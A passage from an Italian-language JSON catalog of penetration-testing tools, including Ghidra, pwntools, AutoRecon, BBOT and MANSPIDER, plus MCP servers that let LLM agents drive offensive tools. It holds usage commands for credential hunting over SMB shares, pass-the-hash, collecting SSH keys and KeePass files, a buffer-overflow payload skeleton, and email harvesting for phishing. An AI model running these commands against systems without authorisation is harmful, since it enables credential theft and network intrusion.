    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ghidra</strong> è una piattaforma software di reverse engineering (SRE) sviluppata dal Research Directorate della NSA. Offre un ambiente completo per l'analisi di file binari (malware, firmware, eseguibili) su una vasta gamma di architetture (x86, ARM, MIPS, PowerPC, ecc.). La sua caratteristica più potente è il <strong>Decompiler</strong> avanzato, che ricostruisce una rappresentazione simil-C del codice assembly, rendendo l'analisi comprensibile anche senza conoscere a fondo l'assembly specifico.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Code Analysis:</strong> Esegue analisi automatica del binario per identificare funzioni, stringhe, chiamate di sistema e strutture dati. Il grafo di flusso (Function Graph) visualizza logicamente i percorsi di esecuzione.</p><p><strong>Collaborazione:</strong> Supporta il reverse engineering in team: più analisti possono lavorare sullo stesso progetto in tempo reale, condividendo annotazioni, rinomine di variabili e scoperte tramite un server centralizzato.</p><p><strong>Scripting & Estensibilità:</strong> Permette di automatizzare task ripetitivi tramite script in Java o Python. È possibile scrivere analizzatori custom per decifrare stringhe offuscate o risolvere importazioni dinamiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ghidra è un'applicazione GUI Java. Si crea un progetto, si importa il file e si lancia l'Auto Analyze.</p><pre><code># Workflow tipico (GUI)\n1. File -> New Project\n2. Import File (drag & drop del malware/eseguibile)\n3. Double click per aprire nel CodeBrowser\n4. \"Yes\" alla richiesta di Auto Analyze\n5. Navigare il Decompiler window per leggere il codice \"C-like\"</code></pre><p>Esiste anche una modalità \"Headless\" per analisi batch da riga di comando: <code>analyzeHeadless projectPath projectName -import binaryFile</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale per <strong>Malware Analysis</strong> (capire cosa fa un ransomware), <strong>Vulnerability Research</strong> (trovare buffer overflow in software chiusi) e <strong>CTF</strong>. È l'alternativa gratuita e potente a IDA Pro. Utile anche per analizzare firmware di dispositivi IoT per trovare hardcoded credentials.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede JDK installato. L'analisi automatica può impiegare molto tempo su binari grandi. Attenzione quando si analizza malware reale: eseguire sempre in una VM isolata, poiché Ghidra esegue il parsing di formati file complessi che potrebbero teoricamente contenere exploit contro il tool stesso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "pwninit-3-3-1",
    "name": "pwninit",
    "version": "3.3.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/io12/pwninit",
    "desc": "Tool per automatizzare il setup di challenge di Binary Exploitation (CTF): scarica linker, patcha ELF e genera template exploit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pwninit</strong> è uno strumento scritto in Rust che automatizza completamente il setup dell'ambiente locale per le challenge di Binary Exploitation (\"pwn\") nei CTF. Il problema che risolve è comune: le challenge forniscono un binario ELF compilato e la <code>libc.so</code> del server remoto, ma per sviluppare l'exploit localmente è necessario che il binario usi esattamente quella libc. Questo richiede normalmente di scaricare il linker dinamico (<code>ld.so</code>) corretto, patchare il binario con <code>patchelf</code> per usare quel linker e impostare l'RPATH. pwninit esegue tutti questi passaggi in un singolo comando, eliminando errori manuali e risparmiando tempo prezioso durante le competizioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Download Linker:</strong> Dato il file <code>libc.so.6</code>, pwninit determina automaticamente la versione esatta e scarica il corrispondente <code>ld-linux.so</code> dal repository Ubuntu/Debian. Questo è fondamentale perché un mismatch tra libc e linker causa crash immediati.</p><p><strong>Binary Patching:</strong> Usa <code>patchelf</code> sotto il cofano per impostare l'interprete ELF (<code>PT_INTERP</code>) e l'<code>RPATH</code> del binario target, creando una copia patchata (es. <code>challenge_patched</code>) che gira localmente esattamente come sul server remoto.</p><p><strong>Template Generation:</strong> Genera automaticamente un file <code>solve.py</code> con il boilerplate per <code>pwntools</code>: importazioni, caricamento dell'ELF e della libc con i percorsi corretti, connessione locale/remota configurabile, e uno scheletro pronto per inserire il payload dell'exploit.</p><p><strong>Unstripping:</strong> Se disponibile, scarica i simboli di debug per la libc fornita, permettendo di avere nomi di funzioni leggibili durante il debugging con GDB/pwndbg.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Posizionare il binario e la libc nella stessa cartella ed eseguire pwninit.</p><pre><code># Setup automatico (rileva binario e libc nella cartella corrente)\npwninit\n\n# Specificare i file manualmente\npwninit --bin challenge --libc libc.so.6\n\n# Specificare anche il linker se già scaricato\npwninit --bin challenge --libc libc.so.6 --ld ld-2.27.so\n\n# Generare solo il template senza patchare\npwninit --template-only\n\n# Usare un template personalizzato\npwninit --template-path ~/my_template.py</code></pre><p>Dopo l'esecuzione, la cartella conterrà: il binario patchato (<code>challenge_patched</code>), il linker scaricato (<code>ld-2.XX.so</code>), e lo script <code>solve.py</code> pronto per l'uso.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>CTF Pwn Challenges:</strong> Uso principale durante competizioni CTF. Risparmia 10-15 minuti di setup manuale per ogni challenge, tempo critico durante gare a tempo. Garantisce che gli offset della libc locale corrispondano esattamente a quelli del server remoto.</p><p><strong>Exploit Development Training:</strong> Utile anche per chi studia binary exploitation su piattaforme come HackTheBox, TryHackMe o PicoCTF. Elimina la frustrazione del setup iniziale permettendo di concentrarsi sulla parte tecnica dell'exploit.</p><p><strong>Riproduzione di CVE:</strong> Quando si analizza una vulnerabilità specifica che richiede una versione particolare della libc, pwninit semplifica la configurazione dell'ambiente di test.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dipendenze:</strong> Richiede <code>patchelf</code> e <code>elfutils</code> installati nel sistema. Su Kali Linux sono già presenti, ma su altre distribuzioni potrebbe essere necessario installarli manualmente.</p><p><strong>Uso offline:</strong> Il download automatico del linker richiede connessione internet. Per ambienti offline, è possibile fornire manualmente il linker con il flag <code>--ld</code>.</p><p><strong>Compatibilità:</strong> Funziona esclusivamente con binari ELF Linux. Non supporta binari Windows PE o macOS Mach-O. Supporta architetture x86, x86_64, ARM e AArch64.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "pwntools-4-14-1",
    "name": "pwntools",
    "version": "4.14.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Gallopsled/pwntools",
    "desc": "Framework Python per Capture The Flag e exploit development: semplifica interazione con binari, socket, packing dati e ROP chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pwntools</strong> è una libreria Python progettata per rendere la scrittura di exploit rapida e robusta. È lo standard per le competizioni CTF (categoria Pwn/Binary Exploitation) ma è potente anche per exploit reali. Astrae la complessità di gestire socket, process pipes, conversioni di interi in byte (packing), e costruzione di payload ROP (Return Oriented Programming), permettendo all'exploiter di concentrarsi sulla logica della vulnerabilità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Tubes:</strong> Interfaccia unificata per comunicare con processi locali, socket remoti o serial port (<code>io.sendline()</code>, <code>io.recvuntil()</code>).</p><p><strong>ELF & ROP:</strong> Parsing automatico di binari ELF per trovare indirizzi di funzioni, stringhe e gadget ROP. Genera catene ROP automaticamente se possibile.</p><p><strong>Shellcode:</strong> Generatore integrato di shellcode per varie architetture (x86, ARM, MIPS) e OS.</p><p><strong>GDB Integration:</strong> Collega automaticamente un debugger GDB al processo target per analisi dinamica durante lo sviluppo dell'exploit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si usa importando la libreria in script Python.</p><pre><code>from pwn import *\n\n# Connessione remota o avvio processo locale\nio = remote('target.com', 1337)\n# io = process('./vulnerable_binary')\n\n# Costruzione payload (Buffer Overflow)\npayload = b'A' * 64 + p64(0xdeadbeef)\n\n# Invio e interazione\nio.sendline(payload)\nio.interactive()</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Essenziale per sviluppare <strong>Buffer Overflow Exploit</strong>, format string attacks e heap exploitation. Usato per automatizzare l'interazione con servizi di rete complessi durante le fasi di fuzzing o exploit delivery.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>È un framework di sviluppo, non un tool \"point-and-click\". Richiede conoscenza di Python e assembly.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "5ire-0-13-2-appimage",
    "name": "5ire-0.13.2-x86_64.AppImage",
    "version": "0.13.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nanbingxyz/5ire",
    "desc": "Client desktop open-source per interagire con server MCP (Model Context Protocol) e agenti AI locali/remoti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>5ire</strong> è un client desktop open-source progettato per il <strong>Model Context Protocol (MCP)</strong>, lo standard emergente per connettere modelli di linguaggio (LLM) a strumenti e dati esterni. Distribuito come AppImage per portabilità immediata su Linux, 5ire fornisce un'interfaccia grafica unificata per interagire con server MCP, agenti AI e tool di cybersecurity. Permette ai pentester di orchestrare strumenti offensivi (Nmap, Burp, script custom) attraverso conversazioni in linguaggio naturale con un LLM, mantenendo il controllo umano sul loop decisionale. L'architettura è basata su Electron con React, offrendo un'esperienza desktop nativa con la flessibilità di un'applicazione web.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MCP Client Universale:</strong> Si connette a qualsiasi server compatibile con lo standard MCP, caricando automaticamente le \"skill\" disponibili (tool, risorse, prompt). Supporta connessioni simultanee a più server MCP, permettendo di combinare tool da fonti diverse in un'unica sessione.</p><p><strong>Multi-Provider LLM:</strong> Supporta molteplici provider di modelli AI: OpenAI (GPT-4), Anthropic (Claude), Google (Gemini), modelli locali via Ollama/LM Studio, e qualsiasi endpoint compatibile OpenAI. Permette di passare da un modello all'altro senza riavviare la sessione.</p><p><strong>Gestione Conversazioni:</strong> Mantiene lo storico completo delle conversazioni con gli agenti AI, inclusi gli output dei tool eseguiti, i log di errore e i risultati intermedi. Supporta branching delle conversazioni per esplorare approcci alternativi.</p><p><strong>Tool Monitoring:</strong> Visualizza in tempo reale l'esecuzione dei tool invocati dall'AI, mostrando parametri di input, output e stato di completamento. Include una modalità di approvazione manuale (human-in-the-loop) per validare azioni potenzialmente distruttive prima dell'esecuzione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Rendere eseguibile il file AppImage e lanciarlo. Nessuna installazione richiesta.</p><pre><code># Rendere eseguibile e avviare\nchmod +x 5ire-0.13.2-x86_64.AppImage\n./5ire-0.13.2-x86_64.AppImage\n\n# Configurazione iniziale (dalla GUI)\n# 1. Settings → API Keys: configurare le chiavi per i provider LLM\n# 2. MCP Servers: aggiungere endpoint dei server MCP\n#    es. http://localhost:8080 per HexStrike locale\n# 3. Selezionare il modello preferito dalla dropdown\n# 4. Iniziare la conversazione con il tool desiderato</code></pre><p>Dall'interfaccia, la barra laterale mostra i server MCP connessi e i tool disponibili. Il pannello principale è una chat dove l'utente descrive l'obiettivo e l'AI seleziona e invoca i tool appropriati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>AI-Assisted Pentesting:</strong> Utilizzo principale come console di comando per guidare l'AI nell'esecuzione di ricognizioni, vulnerability scanning o exploitation. L'operatore descrive l'obiettivo (\"scansiona le porte aperte di 10.10.10.1\") e l'AI traduce in comandi concreti usando i tool MCP disponibili.</p><p><strong>Orchestrazione Multi-Tool:</strong> Permette di concatenare tool diversi in workflow complessi. Esempio: OSINT su un dominio → enumerazione sottodomini → port scanning → vulnerability assessment, tutto guidato da conversazione naturale.</p><p><strong>Training e Documentazione:</strong> Utile per team di security che vogliono documentare le procedure: le conversazioni con l'AI creano automaticamente un log dettagliato delle azioni eseguite, utilizzabile come report.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Privacy dei dati:</strong> Le conversazioni vengono inviate al provider LLM selezionato. Se si usano modelli cloud (OpenAI, Anthropic), i dettagli dell'infrastruttura target potrebbero essere esposti. Per operazioni sensibili, preferire modelli locali via Ollama.</p><p><strong>Affidabilità AI:</strong> I modelli AI possono generare comandi errati o pericolosi. La modalità human-in-the-loop è fondamentale per validare ogni azione prima dell'esecuzione, specialmente con tool distruttivi.</p><p><strong>Traffico di rete:</strong> 5ire stesso genera traffico verso i provider LLM e i server MCP. In ambienti monitorati, questo traffico aggiuntivo può essere rilevato e analizzato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "AI_MCP"
    ],
    "notes": null
  },
  {
    "id": "hexstrike-ai",
    "name": "hexstrike-ai",
    "version": "6.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/0x4m4/hexstrike-ai",
    "desc": "Server MCP che integra LLM con 150+ tool offensivi per automatizzare recon, scanning e reporting in scenari pentest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HexStrike AI è un'innovativa implementazione del Model Context Protocol (MCP) che funge da ponte tra i moderni Large Language Models (come Claude, GPT-4) e l'arsenale di strumenti di cybersecurity. Permette agli agenti AI di \"usare\" fisicamente tool come Nmap, Nikto, SQLmap o script custom, orchestrando intere fasi di penetration test in autonomia o sotto supervisione umana, gestendo l'input/output e la logica decisionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Orchestrazione Multi-Agente:</strong> Crea agenti specializzati (es. \"Recon Agent\", \"Exploit Agent\") che collaborano. L'AI decide quale tool lanciare basandosi sui risultati dello step precedente (es. \"Ho trovato la porta 80 aperta con Nmap, ora lancio Nikto\").</p><p><strong>Integrazione Toolset:</strong> Supporta nativamente oltre 150 strumenti offensivi. Gestisce l'installazione, la sintassi corretta dei comandi e il parsing dell'output per renderlo comprensibile al modello linguistico.</p><p><strong>Reporting & Logging:</strong> Traccia ogni azione eseguita e genera report narrativi delle scoperte. Include meccanismi di sicurezza (Human-in-the-loop) per richiedere approvazione prima di eseguire azioni aggressive o pericolose.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si configura come server MCP a cui l'LLM client si connette.</p><pre><code># Avvio del server MCP\npython hexstrike_server.py --config config.yaml\n\n# Esempio di prompt all'AI collegata\n\"Esegui una ricognizione completa su target.com. Inizia con discovery sottodomini,\npoi scansiona le porte e identifica le tecnologie web.\nSegnala eventuali vulnerabilità critiche ma chiedi conferma prima di lanciare exploit.\"</code></pre><p>Richiede un file di configurazione con i percorsi dei tool e le API key necessarie.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Automated Pentesting:</strong> Velocizza drasticamente le fasi di ricognizione e vulnerabilità assessment iniziali.</p><p><strong>Red Teaming Assistito:</strong> Funge da \"copilota\" per l'operatore, suggerendo comandi o analizzando output complessi in tempo reale.</p><p><strong>Training:</strong> Permette ai junior di vedere come un'AI strutturerebbe un attacco logico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'automazione AI tende ad essere veloce e \"robotica\".</p><p>Se non configurata con delay e jitter, genererà pattern di traffico molto rumorosi. <strong>Rischi:</strong> Un'AI potrebbe \"allucinare\" un comando distruttivo o attaccare un target fuori scope se le regole di ingaggio (System Prompt) non sono rigorose.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "AI_MCP"
    ],
    "notes": null
  },
  {
    "id": "arjun",
    "name": "arjun",
    "version": "2.2.7",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/s0md3v/Arjun",
    "desc": "Tool per HTTP parameter discovery che trova parametri nascosti in endpoint web con dizionario di 25.000+ voci.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Arjun</strong> è uno strumento di ricognizione specializzato nella scoperta di parametri HTTP nascosti o non documentati negli endpoint delle applicazioni web. Utilizza un dizionario di oltre 25.890 nomi di parametri derivati da CommonCrawl, SecLists e param-miner, riuscendo a testarli tutti con sole 50-60 richieste in meno di 10 secondi grazie a tecniche di ottimizzazione avanzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Method Support:</strong> Supporta GET, POST, POST-JSON e POST-XML per testare parametri in diversi contesti di richiesta.</p><p><strong>Rate Limit Handling:</strong> Gestisce automaticamente rate limiting e timeout, adattando la velocità di scansione.</p><p><strong>Export Flessibile:</strong> Esporta risultati in formato BurpSuite, testo o JSON per integrazione con altri tool.</p><p><strong>Passive Extraction:</strong> Può estrarre parametri passivamente da file JavaScript o sorgenti esterne.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione base con tutti i metodi HTTP\narjun -u https://target.com/api/users -m GET,POST,JSON,XML\n\n# Con header custom (auth, cookie session)\narjun -u https://target.com/admin -m POST \\\n  --headers \"Authorization: Bearer eyJ0eX...\" \\\n  --headers \"Cookie: session=abc123\"\n\n# Batch scan da lista URL (es. output gau/waybackurls)\ncat urls.txt | arjun -i - -oJ discovered_params.json -t 10\n\n# Estrai parametri passivamente da JS (no richieste al target)\narjun --passive -i https://target.com/app.js -oT params.txt\n\n# Pipeline completa: gau -> filtra endpoint -> arjun -> test\ngau target.com | grep \"api\\|admin\" | sort -u | \\\n  arjun -i - -oJ params.json --stable\n\n# Export per Burp Suite (import diretto)\narjun -u https://target.com/search -oB burp_import.txt\n\n# Con wordlist custom + dizionario default\narjun -u https://target.com/api -w custom_params.txt --include</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>API Reconnaissance:</strong> Scopre parametri admin nascosti, debug endpoints o funzionalità non documentate che potrebbero esporre vulnerabilità come IDOR, privilege escalation o information disclosure.</li><li><strong>Bug Bounty:</strong> La scoperta di parametri nascosti spesso porta a vulnerabilità uniche non trovate da altri ricercatori.</li><li><strong>Web Application Pentesting:</strong> Espande la superficie d'attacco oltre i parametri documentati nelle API pubbliche.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> Le 50-60 richieste generate sono relativamente silenziose ma potrebbero attivare WAF se troppo rapide.</li><li><strong>Throttling:</strong> Usare <code>--stable</code> per delay automatici in ambienti con rate limiting.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Params_Discovery"
    ],
    "notes": null
  },
  {
    "id": "autorecon",
    "name": "autorecon",
    "version": "2.0.36",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/Tib3rius/AutoRecon",
    "desc": "Framework di ricognizione automatizzata che orchestra port scan e service enumeration su target multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>AutoRecon</strong> è un framework Python per automatizzare la fase iniziale di enumerazione nei penetration test. Opera in due fasi: prima esegue port scan per identificare servizi aperti, poi lancia tool di enumerazione specifici per ogni servizio rilevato (es. scansione web se trova HTTP, enum4linux se trova SMB). Descritto come \"bowling with bumpers\", automatizza il lavoro ripetitivo mantenendo il controllo sulle azioni aggressive.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Target:</strong> Gestisce IP singoli, range CIDR e hostname risolvibili in parallelo.</p><p><strong>Plugin System:</strong> Moduli configurabili per port scanning e service enumeration, estendibili dall'utente.</p><p><strong>Output Organizzato:</strong> Genera directory strutturate per exploit, findings e report dettagliati.</p><p><strong>Pattern Matching:</strong> Evidenzia ed estrae automaticamente informazioni significative dai risultati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione OSCP-style (singolo target, output strutturato)\nautorecon 10.10.10.1 -o ./htb_box --single-target\n\n# Multi-target con priorità e verbosità massima\nautorecon -t targets.txt -o ./pentest_results -vv \\\n  --target-timeout 120  # 2 ore per target\n\n# Solo porte specifiche (velocizza per CTF)\nautorecon 10.10.10.1 --ports-file /usr/share/seclists/Discovery/Infrastructure/common-ports.txt\n\n# Esclusione plugin rumorosi (stealth mode)\nautorecon 10.10.10.1 --exclude-tags aggressive,bruteforce\n\n# Con proxy per traffico (Burp logging)\nautorecon 10.10.10.1 --proxychains\n\n# Workflow OSCP completo\nmkdir -p ~/oscp/{exam,lab} && cd ~/oscp/exam\nautorecon 192.168.x.x -o machine1 &  # Background\nautorecon 192.168.y.y -o machine2 &  # Parallelo\n# Mentre scans procedono, analizza output incrementale:\ntail -f machine1/scans/_commands.log\n\n# Analisi risultati post-scan\nfind ./results -name \"*.txt\" -exec grep -l \"password\\|credential\" {} \\;\ncat ./results/*/scans/*nmap*.txt | grep open</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>CTF e OSCP:</strong> Ideale per lanciare ricognizione su un target e lavorare su altri mentre l'automazione procede. Rispetta le regole d'esame non eseguendo exploitation automatico.</li><li><strong>Internal Pentest:</strong> Automatizza l'enumerazione iniziale di decine di host risparmiando ore di lavoro manuale.</li><li><strong>HackTheBox/TryHackMe:</strong> Output strutturato perfetto per prendere appunti e documentare il processo.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> Genera traffico significativo con scan e enumeration paralleli. Non adatto per engagement stealth.</li><li><strong>Riduzione Footprint:</strong> Usare <code>--exclude-tags aggressive</code> per escludere plugin rumorosi.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "bbot",
    "name": "bbot",
    "version": "2.7.2",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/blacklanternsecurity/bbot",
    "desc": "Scanner ricorsivo per subdomain enumeration, web crawling, email harvesting e vulnerability discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>BBOT</strong> (Bighuge BLS OSINT Tool) è uno scanner ricorsivo multipurpose ispirato a Spiderfoot. Combina subdomain enumeration, web crawling, email harvesting e vulnerability scanning in un unico framework modulare. Integra oltre 50 fonti passive e attive, trovando tipicamente 20-50% più subdomain rispetto ad altri tool grazie al suo approccio ricorsivo che concatena le tecniche di ricognizione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Target Diversificati:</strong> Accetta domini, IP, URL, email, organizzazioni, username, filesystem e mobile app.</p><p><strong>Output Multipli:</strong> Supporta Neo4j, Slack, Discord, Elasticsearch e 13+ altri formati.</p><p><strong>YARA Scanning:</strong> Applica regole YARA custom sugli asset scoperti.</p><p><strong>Modular Architecture:</strong> Permette contributi della community per nuovi moduli.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Subdomain enumeration completa (passiva + attiva)\nbbot -t target.com -f subdomain-enum -o ./bbot_output\n\n# Solo PASSIVE recon (zero traffico verso target)\nbbot -t target.com -f safe --allow-deadly  # safe = solo API\n\n# Bug Bounty workflow completo\nbbot -t target.com -f subdomain-enum web-basic cloud-enum \\\n  -c modules.nuclei.severity=high,critical \\\n  -om json,csv,neo4j\n\n# Con API keys per più risultati (configura ~/.bbot/secrets.yml)\nbbot -t target.com -f subdomain-enum \\\n  --config modules.shodan.api_key=xxx \\\n  --config modules.censys.api_id=yyy\n\n# Scope specifico (esclude out-of-scope)\nbbot -t target.com -f subdomain-enum \\\n  --whitelist *.target.com \\\n  --blacklist dev.target.com,staging.target.com\n\n# Pipeline con altri tool\nbbot -t target.com -f subdomain-enum -om json | \\\n  jq -r '.data.DNS_NAME' | httpx -silent | nuclei -t cves/\n\n# Email harvesting per phishing assessment\nbbot -t target.com -m emailformat,hunter,skymem -o emails/\n\n# Scan ricorsivo (trova subdomain dei subdomain)\nbbot -t target.com -f subdomain-enum --config scope.recursion_max=3</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Bug Bounty:</strong> Ricognizione completa dell'attack surface con approccio ricorsivo che trova 20-50% più subdomain rispetto ad altri tool.</li><li><strong>Attack Surface Management (ASM):</strong> Gestione asset esterni e discovery continuo per organizzazioni con infrastrutture complesse.</li><li><strong>Threat Intelligence:</strong> Raccolta informazioni su target specifici combinando OSINT da 50+ fonti.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> I moduli attivi generano traffico significativo verso il target e fonti terze.</li><li><strong>Stealth Mode:</strong> Usare flag <code>-f safe</code> per reconnaissance puramente passiva.</li><li><strong>Rate Limiting:</strong> Configura <code>--config http.max_rate=10</code> per throttling in ambienti sensibili.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "manspider",
    "name": "manspider",
    "version": "1.1.2",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/blacklanternsecurity/MANSPIDER",
    "desc": "Crawler SMB per cercare file sensibili nelle share di rete usando regex su nomi e contenuti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MANSPIDER</strong> è uno strumento di ricognizione che esplora sistematicamente le share SMB di intere reti alla ricerca di file sensibili. Supporta la ricerca tramite regex sia nei nomi dei file che nei contenuti, con capacità di estrazione testo da PDF, DOCX, XLSX, PPTX e altri formati. Può usare autenticazione standard, NTLM hash o Kerberos, con fallback automatico a guest/null session.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Content Search:</strong> Cerca pattern regex all'interno dei documenti, non solo nei nomi file.</p><p><strong>Multi-Format:</strong> Estrae testo da PDF, Office, e formati text-based. OCR opzionale per immagini.</p><p><strong>Auth Chain:</strong> Prova credenziali fornite → guest → null session automaticamente.</p><p><strong>Loot Directory:</strong> Scarica automaticamente i file trovati in directory organizzate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Credential hunting - cerca file con password nei nomi\nmanspider 192.168.1.0/24 -f \"password|passwd|cred|secret\" \\\n  -u domain\\\\user -p 'P@ssw0rd' -t 5  # 5 thread (stealth)\n\n# Cerca CONTENUTO nei documenti (regex nel body)\nmanspider targets.txt -c \"API[_-]?KEY|aws_secret|AKIA[0-9A-Z]\" \\\n  -e pdf,docx,xlsx,txt,config,xml,json\n\n# Pass-the-Hash con NTLM (post-exploitation)\nmanspider 10.10.10.0/24 -f \"*.kdbx|*.key|id_rsa\" \\\n  -u administrator -H aad3b435b51404ee:8846f7eaee8fb117\n\n# Kerberos auth (con ticket già in cache)\nexport KRB5CCNAME=/tmp/krb5cc_user\nmanspider dc01.corp.local -f \"*.pfx|*.p12\" -k\n\n# Cerca solo in share specifiche (ignora IPC$, ADMIN$)\nmanspider 192.168.1.0/24 -f \"confidential\" \\\n  --sharenames \"Finance,HR,IT\" --exclude-sharenames \"SYSVOL\"\n\n# Download automatico in loot directory organizzata\nmanspider targets.txt -f \"*.kdbx|backup*|*.bak\" \\\n  -u user -p pass -o ./loot --max-filesize 50M\n\n# Post-exploitation: cerca connessioni DB\nmanspider dc01 -c \"connectionstring|Data Source=|Server=.*Password\" \\\n  -e config,xml,ini,json -d 5  # depth 5 directory</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Credential Hunting:</strong> Trova file con password, chiavi SSH, certificati, database KeePass e altri secret nelle share di rete.</li><li><strong>Data Discovery:</strong> Identifica documenti finanziari, config con connection string, API keys nelle share aziendali.</li><li><strong>Post-Exploitation:</strong> Dopo aver compromesso un account domain, esplora sistematicamente le share accessibili per privilege escalation.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> L'accesso massivo alle share genera log SMB significativi (Event ID 5140, 5145).</li><li><strong>Stealth:</strong> Usare <code>-t 1</code> per threading singolo in ambienti con SIEM/SOC attivo.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "uro",
    "name": "uro",
    "version": "1.0.2",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/s0md3v/uro",
    "desc": "Utility per filtrare e dedupare liste di URL rimuovendo duplicati, asset statici e contenuti ridondanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Uro</strong> è un'utility Python per pulire e filtrare liste di URL prima del security testing. Rimuove intelligentemente URL ridondanti, duplicati, asset statici (immagini, JS, CSS), URL incrementali (/page/1/, /page/2/) e contenuti blog, tutto senza effettuare richieste HTTP. Opera completamente offline analizzando solo la struttura degli URL.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Deduplication:</strong> Rimuove URL con stesso path ma valori parametri diversi.</p><p><strong>Extension Filter:</strong> Whitelist/blacklist per estensioni specifiche.</p><p><strong>Vuln Detection:</strong> Flag per identificare URL con parametri noti come vulnerabili.</p><p><strong>Content Filtering:</strong> Opzione per preservare o rimuovere contenuti blog-style.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Pipeline completa: gau -> uro -> nuclei\ngau target.com | uro | nuclei -t cves/\n\n# Solo URL con parametri (per injection testing)\ncat all_urls.txt | uro --filter hasparams > params_only.txt\n\n# Identifica URL con parametri potenzialmente vulnerabili\n# (id, file, path, url, redirect, etc.)\ncat urls.txt | uro --filter vuln | tee vuln_candidates.txt\n\n# Whitelist solo estensioni interessanti\ncat urls.txt | uro -w 